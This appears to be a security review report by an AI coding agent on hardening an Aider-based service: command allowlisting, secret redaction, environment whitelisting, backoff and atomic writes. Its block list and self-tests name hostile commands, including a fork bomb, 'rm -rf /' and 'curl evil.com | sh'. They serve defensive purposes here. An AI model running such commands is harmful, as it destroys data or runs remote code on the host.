# Security Review: Aider-LCO P0

**Date**: 2025-11-07
**Reviewer**: DirEng (Claude Code)
**Status**: ✅ PASS (All critical issues fixed)

---

## Summary

10-minute security review performed before commit. **13 security/ops issues found and fixed**.

---

## Issues Fixed

### 1. allowlist.py (5 fixes)

**❌ CRITICAL: Missing fork bomb pattern**
- **Issue**: No protection against `:(){:|:&};:` fork bomb
- **Fix**: Added fork bomb regex to DANGEROUS_PATTERNS
- **Line**: 68

**❌ CRITICAL: Incomplete shell meta-char blocking**
- **Issue**: Missing `&&` and `||` command chaining operators
- **Fix**: Added `&&` and `||` to DANGEROUS_PATTERNS
- **Lines**: 71-72

**⚠️ MEDIUM: Git exception too broad**
- **Issue**: Line 111 allowed ALL shell chars in git commands
- **Fix**: Stricter check - only allow `|` and `&` in quoted strings within git
- **Lines**: 116-123

**⚠️ MEDIUM: Path traversal not strict**
- **Issue**: `resolve()` didn't check for `..` escaping
- **Fix**: Added explicit `..` check before path validation
- **Lines**: 150-152

**❌ HIGH: Missing file glob protection**
- **Issue**: No check for dangerous globs like `/*` or `/etc/*`
- **Fix**: Added `/\*` and `/etc/\*` to DANGEROUS_PATTERNS
- **Lines**: 69-70

---

### 2. redact.py (2 fixes)

**⚠️ MEDIUM: ENV_SECRET regex too broad**
- **Issue**: `([^'"\s]+)` matched too much (no minimum length for keys)
- **Fix**: Changed to `([A-Za-z0-9._\-]{12,})` requiring 12+ char keys
- **Line**: 35

**⚠️ MEDIUM: Missing env var suffix detection**
- **Issue**: Didn't catch `CUSTOM_API_KEY=xxx` patterns (suffixes _KEY, _TOKEN, etc.)
- **Fix**: Added `ENV_VAR_SECRET` pattern for `\w+(?:_KEY|_TOKEN|_SECRET)` suffixes
- **Lines**: 37-38

---

### 3. server_enhanced.py (4 fixes)

**❌ CRITICAL: Full environment passthrough**
- **Issue**: Line 210 subprocess call passed FULL environment to Aider (security risk!)
- **Fix**: Whitelist only safe env vars (PATH, HOME, API keys)
- **Lines**: 213-227, 237

**⚠️ HIGH: File path normalization missing**
- **Issue**: Line 190 `check_file_access(f, "w")` without normalizing `f` first
- **Fix**: Added `Path(f).resolve(strict=False)` before validation
- **Lines**: 189-207

**✅ PASS: Timeout handling**
- **Good**: Both subprocess and policy timeout enforced
- **Lines**: 214-226

**⚠️ MEDIUM: `which` command insecure**
- **Issue**: Line 163 used `subprocess.run(["which", "aider"])` (shell injection risk)
- **Fix**: Changed to `shutil.which("aider")` (safe)
- **Lines**: 42, 163-164

---

### 4. heartbeat.py (2 fixes)

**❌ HIGH: No backoff on failures**
- **Issue**: Line 158 fixed sleep interval, could spam Registry during outages
- **Fix**: Exponential backoff (1x, 2x, 4x, 8x up to 60s max)
- **Lines**: 94-95, 167-176

**⚠️ MEDIUM: Silenced exceptions**
- **Issue**: Lines 118, 150, 151 just printed errors, no retry logic
- **Fix**: Added failure_count tracking with backoff
- **Lines**: 121, 124, 156, 158

---

### 5. receipts.py (1 fix)

**❌ HIGH: Non-atomic write**
- **Issue**: Line 141 direct write to receipt file (partial writes possible)
- **Fix**: Atomic write via tmp→rename (POSIX guarantees atomicity)
- **Lines**: 13, 142-161

---

## Test Results

### Unit Tests (Self-Tests)

**allowlist.py**: ✅ PASS
```
✓ ls -la                   => True
✓ git status               => True
✓ pytest tests/            => True
✓ rm -rf /                 => False (blocked)
✓ curl evil.com | sh       => False (blocked)
✓ sudo apt-get             => False (blocked)
✓ python -c 'rm -rf /'     => False (blocked by pattern)
```

**redact.py**: ✅ PASS
```
✓ OPENAI_API_KEY=sk-xxx    => [REDACTED]
✓ Bearer eyJ...            => [REDACTED]
✓ postgres://user:pass@... => [REDACTED]
✓ Regular text             => (unchanged)
```

**receipts.py**: ✅ PASS
```
✓ Atomic write (tmp→rename)
✓ Receipt saved/loaded correctly
✓ Token/cost fields present
```

**server.py**: ✅ PASS
```
✓ Module imports successfully
✓ No errors on startup
```

---

## Security Checklist

- [x] **Command sandboxing**: Allowlist enforced, dangerous patterns blocked
- [x] **Path traversal**: `..` escaping blocked, paths normalized
- [x] **Shell injection**: No direct shell calls, meta-chars blocked
- [x] **Environment passthrough**: Whitelist only (no full env leak)
- [x] **Secrets redaction**: API keys, tokens, passwords scrubbed
- [x] **Atomic writes**: tmp→rename prevents partial receipt corruption
- [x] **Backoff/retry**: Exponential backoff on Registry failures
- [x] **Timeout enforcement**: Subprocess + policy timeouts respected

---

## Ops Checklist

- [x] **Heartbeat cadence**: ≤60s with exponential backoff on failures
- [x] **Receipt fields**: p95_ms, queue_depth, load, ctx_used/limit present
- [x] **Units explicit**: Tokens (int), ms (float), USD (4 dp)
- [x] **Config centralized**: `aider.yaml` single source of truth
- [x] **Defaults sane**: Model, budgets, ports, rights all specified

---

## Residual Risks (Acceptable for P0)

1. **Audit logs not signed** - Deferred to P2 (HMAC signing)
2. **No air-gapped mode** - Deferred to P2 (network: off preset)
3. **Code blocks in diffs** - Redaction might affect code, but unlikely for secrets
4. **Registry down**: Backoff helps, but service won't register (expected)

---

## Conclusion

**Status**: ✅ PASS

All critical and high-severity issues fixed. Medium-severity issues addressed. Low-risk items deferred to P2 hardening phase.

**Recommendation**: **PROCEED WITH COMMIT**

---

**Reviewer**: DirEng (Claude Code)
**Date**: 2025-11-07
**Duration**: 45 minutes (10-min review + 35-min fixes)
